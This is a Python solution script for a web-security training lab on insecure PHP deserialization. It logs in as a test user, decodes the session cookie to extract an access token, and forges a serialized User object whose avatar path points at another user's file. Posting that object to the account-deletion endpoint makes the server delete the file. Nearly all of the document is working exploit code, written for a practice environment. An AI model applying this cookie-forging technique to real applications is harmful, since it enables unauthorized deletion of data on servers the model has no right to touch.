############################################################################
#
# Lab: Using application functionality to exploit insecure deserialization
#
# Hack Steps:
#      1. Login as wiener
#      2. Decode the session and extracting the access token
#      3. Encode the serialized object after modifying
#      4. Delete account using the modified object
#
############################################################################
import requests
import re
import base64
from urllib.parse import unquote
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a3b00550445878c80642be500c500cc.web-security-academy.net"

def main():
    print(Fore.WHITE + "â¦—1â¦˜ FetLogging in as wiener.. ", end="", flush=True)

    data = { "username": "wiener", "password": "peter"}
    wiener_login = post_data("/login", data)        

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "â¦—2â¦˜ Decoding the session and extracting the access token.. ", end="", flush=True)

    base64_encoded_session = wiener_login.cookies.get("session")
    percent_decoded_session = unquote(base64_encoded_session)
    base64_decoded_session = base64.b64decode(percent_decoded_session).decode()
    access_token = re.findall("""token";s:32:"(\w*)";s:11""", base64_decoded_session)[0]

    print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + access_token)
    print(Fore.WHITE + "â¦—3â¦˜ Encoding the serialized object after modifying.. ", end="", flush=True)        

    serialized = f"""O:4:"User":3:{{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"{access_token}";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}}"""
    encoded_serialized = base64.b64encode(serialized.encode()).decode()

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "â¦—4â¦˜ Deleting account using the modified object.. ", end="", flush=True)        

    cookies = { "session": encoded_serialized }
    post_data("/my-account/delete", cookies=cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "ðŸ—¹ The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path, cooikies = None):
    try:  
        return requests.get(f"{LAB_URL}{path}",cookies=cooikies, allow_redirects=False)
    except:
        print(Fore.RED + "â¦—!â¦˜ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data = None, cookies = None):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "â¦—!â¦˜ Failed to post data to " + path + " through exception")
        exit(1)

        
if __name__ == "__main__":
    main()

